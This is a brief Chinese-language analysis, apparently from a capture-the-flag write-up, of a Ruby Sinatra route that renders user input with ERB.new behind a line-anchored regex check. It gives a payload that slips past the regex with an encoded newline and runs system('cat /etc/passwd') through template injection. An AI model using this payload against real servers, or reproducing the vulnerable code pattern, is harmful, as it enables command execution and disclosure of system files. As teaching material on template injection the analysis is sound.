## 分析

```ruby
post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = "Malicious Input Detected"
    end
    erb :'index'
  end
```

`ERB.new` 存在模板注入，可以使用换行符来绕过正则表达式 `x%0a%0d<%= system('cat /etc/passwd') %>`

